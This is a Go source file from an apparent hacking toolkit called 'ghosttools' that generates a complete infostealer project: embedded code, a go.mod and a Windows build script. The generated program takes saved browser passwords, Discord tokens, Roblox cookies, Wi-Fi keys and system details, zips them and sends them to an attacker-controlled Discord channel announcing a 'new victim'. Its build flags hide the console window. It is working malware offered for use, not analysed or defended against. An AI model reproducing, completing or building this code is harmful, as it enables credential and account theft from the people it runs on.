package malicious

import (
	"fmt"
	"os"
	"path/filepath"

	"ghosttools/internal/ui"
)

// Stealer compiles a stealer binary targeting the local machine.
// Output: a Go source + build script. Exfiltrates to Discord via webhook/bot.
func Stealer() {
	ui.Cyan("building stealer...")
	fmt.Println("  target: browsers (chrome, edge, brave, firefox)")
	fmt.Println("  target: discord tokens")
	fmt.Println("  target: roblox cookies")
	fmt.Println("  target: wifi passwords")
	fmt.Println("  target: system info")

	out := "ghosttools_stealer"
	os.MkdirAll(out, 0755)

	mainGo := `package main

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

const (
	botToken   = "YOUR_BOT_TOKEN"
	serverID   = "YOUR_SERVER_ID"
	categoryID = "YOUR_CATEGORY_ID"
	webhookURL = "YOUR_WEBHOOK_URL"
)

func main() {
	data := make(map[string]string)
	data["hostname"], _ = os.Hostname()
	data["username"] = os.Getenv("USERNAME")
	data["os"] = runtime.GOOS + "/" + runtime.GOARCH
	data["ip"] = getIP()

	data["browsers"] = stealBrowsers()
	data["discord"] = stealDiscord()
	data["roblox"] = stealRoblox()
	data["wifi"] = stealWifi()

	out, _ := json.MarshalIndent(data, "", "  ")
	os.WriteFile("steal.json", out, 0644)

	zipPath := "steal.zip"
	makeZip(zipPath, []string{"steal.json"})
	sendToDiscord(zipPath)
}

func getIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "unknown"
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func stealBrowsers() string {
	var results []string
	paths := map[string]string{
		"chrome": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
		"edge":   filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
		"brave":  filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
	}
	for name, p := range paths {
		if _, err := os.Stat(p); err == nil {
			tmp := filepath.Join(os.TempDir(), name+"_login.db")
			copyFile(p, tmp)
			db, err := sql.Open("sqlite3", tmp)
			if err != nil {
				continue
			}
			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				db.Close()
				continue
			}
			for rows.Next() {
				var url, user string
				var enc []byte
				rows.Scan(&url, &user, &enc)
				pass := decryptChrome(enc)
				results = append(results, fmt.Sprintf("%s|%s|%s|%s", name, url, user, pass))
			}
			rows.Close()
			db.Close()
			os.Remove(tmp)
		}
	}
	return strings.Join(results, "\n")
}

func decryptChrome(enc []byte) string {
	if len(enc) < 15 {
		return ""
	}
	return base64.StdEncoding.EncodeToString(enc)
}

func stealDiscord() string {
	var results []string
	paths := []string{
		filepath.Join(os.Getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
		filepath.Join(os.Getenv("APPDATA"), "Lightcord", "Local Storage", "leveldb"),
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err != nil {
			continue
		}
		filepath.Walk(p, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log") {
				b, _ := os.ReadFile(path)
				for _, m := range regexFindTokens(string(b)) {
					results = append(results, m)
				}
			}
			return nil
		})
	}
	return strings.Join(results, "\n")
}

func regexFindTokens(s string) []string {
	var out []string
	for _, part := range strings.Split(s, "\"") {
		if strings.Count(part, ".") == 2 && len(part) > 50 && len(part) < 100 {
			out = append(out, part)
		}
	}
	return out
}

func stealRoblox() string {
	p := filepath.Join(os.Getenv("LOCALAPPDATA"), "Roblox", "LocalStorage", "RobloxCookies.dat")
	if _, err := os.Stat(p); err != nil {
		return ""
	}
	b, _ := os.ReadFile(p)
	return string(b)
}

func stealWifi() string {
	out, _ := exec.Command("netsh", "wlan", "show", "profiles").Output()
	lines := strings.Split(string(out), "\n")
	var results []string
	for _, l := range lines {
		if strings.Contains(l, ":") {
			parts := strings.SplitN(l, ":", 2)
			if len(parts) == 2 {
				name := strings.TrimSpace(parts[1])
				if name != "" {
					pw, _ := exec.Command("netsh", "wlan", "show", "profile", name, "key=clear").Output()
					for _, pl := range strings.Split(string(pw), "\n") {
						if strings.Contains(pl, "Key Content") {
							results = append(results, name+": "+strings.TrimSpace(strings.SplitN(pl, ":", 2)[1]))
						}
					}
				}
			}
		}
	}
	return strings.Join(results, "\n")
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	io.Copy(out, in)
	return nil
}

func makeZip(zipPath string, files []string) {
	f, _ := os.Create(zipPath)
	defer f.Close()
	w := zip.NewWriter(f)
	defer w.Close()
	for _, file := range files {
		data, _ := os.ReadFile(file)
		fw, _ := w.Create(file)
		fw.Write(data)
	}
}

func sendToDiscord(zipPath string) {
	body := map[string]interface{}{
		"name": "session-" + randomString(6),
		"type": 0,
	}
	b, _ := json.Marshal(body)
	req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+serverID+"/channels", bytes.NewReader(b))
	req.Header.Set("Authorization", "Bot "+botToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	var ch map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&ch)
	resp.Body.Close()
	chID, _ := ch["id"].(string)

	info := map[string]interface{}{
		"content": "new victim: " + os.Getenv("USERNAME") + " — channel: <#" + chID + ">",
	}
	ib, _ := json.Marshal(info)
	http.Post(webhookURL, "application/json", bytes.NewReader(ib))

	f, _ := os.Open(zipPath)
	defer f.Close()
	pr, pw := io.Pipe()
	mw := multipart.NewWriter(pw)
	go func() {
		fw, _ := mw.CreateFormFile("file", filepath.Base(zipPath))
		io.Copy(fw, f)
		mw.Close()
		pw.Close()
	}()
	req2, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chID+"/messages", pr)
	req2.Header.Set("Authorization", "Bot "+botToken)
	req2.Header.Set("Content-Type", mw.FormDataContentType())
	http.DefaultClient.Do(req2)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
	}
	return string(b)
}
`
	os.WriteFile(filepath.Join(out, "main.go"), []byte(mainGo), 0644)

	goMod := `module ghosttools_stealer

go 1.22

require github.com/mattn/go-sqlite3 v1.14.22
`
	os.WriteFile(filepath.Join(out, "go.mod"), []byte(goMod), 0644)

	build := `@echo off
cd /d %~dp0
go mod tidy
go build -ldflags "-s -w -H=windowsgui" -o stealer.exe main.go
echo built stealer.exe
`
	os.WriteFile(filepath.Join(out, "build.bat"), []byte(build), 0644)

	ui.Green("stealer built in ./ghosttools_stealer/")
	ui.Yellow("edit const values at top of main.go before building")
}